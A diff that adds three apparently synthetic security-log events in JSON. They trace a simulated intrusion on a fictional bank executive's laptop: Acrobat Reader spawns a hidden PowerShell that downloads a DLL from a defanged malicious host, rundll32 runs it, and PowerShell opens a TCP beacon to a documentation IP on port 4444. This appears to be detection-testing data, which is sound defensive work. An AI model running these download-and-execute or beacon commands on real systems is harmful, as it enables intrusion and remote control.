@@ -68,3 +68,239 @@
     }
   ]
 }
+,
+{
+  "metadata": {
+    "event_timestamp": "2025-12-06T09:05:12Z",
+    "event_type": "PROCESS_LAUNCH",
+    "product_name": "Google SecOps Agent",
+    "vendor_name": "Google",
+    "description": "Process creation event mapped from Microsoft Defender (PowerShell spawned by cmd.exe)."
+  },
+  "principal": {
+    "user": {
+      "userid": "user-sid-12345",
+      "windows_sid": "a1b2c3d4-e5f6-7890-1234-567890abcdef"
+    },
+    "hostname": "ceo-laptop01.grandbank.corp",
+
+    "file": {
+      "md5": "3b4f8c21edab51ff72d2655fdde53312",
+      "sha1": "9a7d5f1b8d21431e81e888e98a037ef1293c5db4",
+      "sha256": "",
+      "full_path": "C:\\Windows\\System\\cmd.exe"
+    },
+
+    "process": {
+      "pid": "6540",
+      "file": {
+        "full_path": "C:\\Windows\\System\\cmd.exe"
+      },
+      "command_line": "\"C:\\Windows\\System32\\cmd.exe\" /c powershell -nop -w hidden -c \"Invoke-WebRequest 'hxxps://malicious-update-storage.eastus.cloudapp[.]azure.com/dropper.dll' -OutFile 'C:\\Users\\ceo\\AppData\\Local\\Temp\\updcore.dll'; Start-Sleep -Seconds 5; rundll32.exe 'C:\\Users\\ceo\\AppData\\Local\\Temp\\updcore.dll',EntryPoint\"",
+      "parent_process": {
+        "command_line": "AcroRd32.exe",
+        "file": {
+          "full_path": "C:\\Program Files\\Adobe\\Acrobat Reader\\AcroRd32.exe"
+        }
+      }
+    }
+  },
+
+  "target": {
+    "user": {
+      "userid": "user-sid-12345",
+      "windows_sid": "a1b2c3d4-e5f6-7890-1234-567890abcdef"
+    },
+
+    "hostname": "ceo-laptop01.grandbank.corp",
+
+    "file": {
+      "md5": "a7c80c7a0ed59850fa2d4d98a766df02",
+      "sha1": "6f9e4b3d5a99a2e5e058ebd8d8e71f9e3a2ffbc1",
+      "sha256": "b6c8e15a99457da311df1f18a2f9a330e2b9c1ceb18155269f59b3ce1c55fd96",
+      "full_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+    },
+
+    "process": {
+      "pid": "6678",
+      "file": {
+        "full_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      },
+      "command_line": "powershell -nop -w hidden -c \"Invoke-WebRequest 'hxxps://malicious-update-storage.eastus.cloudapp[.]azure.com/dropper.dll' -OutFile 'C:\\Users\\ceo\\AppData\\Local\\Temp\\updcore.dll'\"",
+      "parent_process": {
+        "command_line": "\"C:\\Windows\\System32\\cmd.exe\" /c powershell -nop -w hidden",
+        "file": {
+          "full_path": "C:\\Windows\\System\\cmd.exe"
+        }
+      }
+    }
+  },
+
+  "security_result": [
+    {
+      "action": "ALLOW",
+      "category": "SOFTWARE_MALICIOUS",
+      "severity": "HIGH",
+      "severity_details": "PowerShell executed by cmd.exe with suspicious hidden and obfuscated flags downloading a remote payload.",
+      "threat_name": "Suspicious_PowerShell_Execution"
+    }
+  ]
+}
+,
+{
+  "metadata": {
+    "event_timestamp": "2025-12-06T09:05:17Z",
+    "event_type": "PROCESS_LAUNCH",
+    "product_name": "Google SecOps Agent",
+    "vendor_name": "Google",
+    "description": "Process creation event mapped from Microsoft Defender (rundll32.exe executed DLL payload)."
+  },
+
+  "principal": {
+    "user": {
+      "userid": "user-sid-12345",
+      "windows_sid": "a1b2c3d4-e5f6-7890-1234-567890abcdef"
+    },
+    "hostname": "ceo-laptop01.grandbank.corp",
+
+    "file": {
+      "md5": "3b4f8c21edab51ff72d2655fdde53312",
+      "sha1": "9a7d5f1b8d21431e81e888e98a037ef1293c5db4",
+      "sha256": "",
+      "full_path": "C:\\Windows\\System32\\cmd.exe"
+    },
+
+    "process": {
+      "pid": "6540",
+      "file": {
+        "full_path": "C:\\Windows\\System32\\cmd.exe"
+      },
+      "command_line": "\"C:\\Windows\\System32\\cmd.exe\" /c powershell -nop -w hidden -c \"Invoke-WebRequest 'hxxps://malicious-update-storage.eastus.cloudapp[.]azure.com/dropper.dll' -OutFile 'C:\\Users\\ceo\\AppData\\Local\\Temp\\updcore.dll'; Start-Sleep -Seconds 5; rundll32.exe 'C:\\Users\\ceo\\AppData\\Local\\Temp\\updcore.dll',EntryPoint\"",
+      "parent_process": {
+        "command_line": "AcroRd32.exe",
+        "file": {
+          "full_path": "C:\\Program Files\\Adobe\\Acrobat Reader\\AcroRd32.exe"
+        }
+      }
+    }
+  },
+
+  "target": {
+    "user": {
+      "userid": "user-sid-12345",
+      "windows_sid": "a1b2c3d4-e5f6-7890-1234-567890abcdef"
+    },
+
+    "hostname": "ceo-laptop01.grandbank.corp",
+
+    "file": {
+      "md5": "7c6a180b36896a0a8c02787eeafb0e4c",
+      "sha1": "372ea79d451c2b845ba3dbb12f0a3cae7d6d3f12",
+      "sha256": "",
+      "full_path": "C:\\Windows\\System32\\rundll32.exe"
+    },
+
+    "process": {
+      "pid": "6684",
+      "file": {
+        "full_path": "C:\\Windows\\System32\\rundll32.exe"
+      },
+      "command_line": "rundll32.exe \"C:\\Users\\ceo\\AppData\\Local\\Temp\\updcore.dll\",EntryPoint",
+      "parent_process": {
+        "command_line": "\"C:\\Windows\\System32\\cmd.exe\" /c powershell -nop -w hidden",
+        "file": {
+          "full_path": "C:\\Windows\\System32\\cmd.exe"
+        }
+      }
+    }
+  },
+
+  "security_result": [
+    {
+      "action": "ALLOW",
+      "category": "SOFTWARE_MALICIOUS",
+      "severity": "HIGH",
+      "severity_details": "rundll32.exe executed a DLL dropped by a suspicious PowerShell command, indicating potential malware staging execution.",
+      "threat_name": "Suspicious_Rundll32_DLL_Execution"
+    }
+  ]
+}
+,
+{
+  "metadata": {
+    "event_timestamp": "2025-12-06T09:05:18Z",
+    "event_type": "PROCESS_LAUNCH",
+    "product_name": "Google SecOps Agent",
+    "vendor_name": "Google",
+    "description": "Process creation mapped from Microsoft Defender (PowerShell beacon-like TCP client activity executed by rundll32.exe)."
+  },
+
+  "principal": {
+    "user": {
+      "userid": "user-sid-12345",
+      "windows_sid": "a1b2c3d4-e5f6-7890-1234-567890abcdef"
+    },
+    "hostname": "ceo-laptop01.grandbank.corp",
+
+    "file": {
+      "md5": "7c6a180b36896a0a8c02787eeafb0e4c",
+      "sha1": "372ea79d451c2b845ba3dbb12f0a3cae7d6d3f12",
+      "sha256": "",
+      "full_path": "C:\\Windows\\System32\\rundll32.exe"
+    },
+
+    "process": {
+      "pid": "6684",
+      "file": {
+        "full_path": "C:\\Windows\\System32\\rundll32.exe"
+      },
+      "command_line": "rundll32.exe \"C:\\Users\\ceo\\AppData\\Local\\Temp\\updcore.dll\",EntryPoint",
+      "parent_process": {
+        "command_line": "\"C:\\Windows\\System32\\cmd.exe\" /c powershell -nop -w hidden",
+        "file": {
+          "full_path": "C:\\Windows\\System32\\cmd.exe"
+        }
+      }
+    }
+  },
+
+  "target": {
+    "user": {
+      "userid": "user-sid-12345",
+      "windows_sid": "a1b2c3d4-e5f6-7890-1234-567890abcdef"
+    },
+
+    "hostname": "ceo-laptop01.grandbank.corp",
+
+    "file": {
+      "md5": "a7c80c7a0ed59850fa2d4d98a766df02",
+      "sha1": "6f9e4b3d5a99a2e5e058ebd8d8e71f9e3a2ffbc1",
+      "sha256": "b6c8e15a99457da311df1f18a2f9a330e2b9c1ceb18155269f59b3ce1c55fd96",
+      "full_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+    },
+
+    "process": {
+      "pid": "7744",
+      "file": {
+        "full_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      },
+      "command_line": "powershell.exe -nop -w hidden -c \"$client = New-Object System.Net.Sockets.TCPClient('198.51.100.21',4444);$stream = $client.GetStream();Simulated beacon activity for security testing\"",
+      "parent_process": {
+        "command_line": "rundll32.exe \"C:\\Users\\ceo\\AppData\\Local\\Temp\\updcore.dll\",EntryPoint",
+        "file": {
+          "full_path": "C:\\Windows\\System32\\rundll32.exe"
+        }
+      }
+    }
+  },
+
+  "security_result": [
+    {
+      "action": "ALLOW",
+      "category": "SOFTWARE_MALICIOUS",
+      "severity": "HIGH",
+      "severity_details": "PowerShell spawned by rundll32.exe executed hidden TCP client code indicative of beaconing or command-and-control behavior.",
+      "threat_name": "Suspicious_PowerShell_TCP_Beacon"
+    }
+  ]
+}
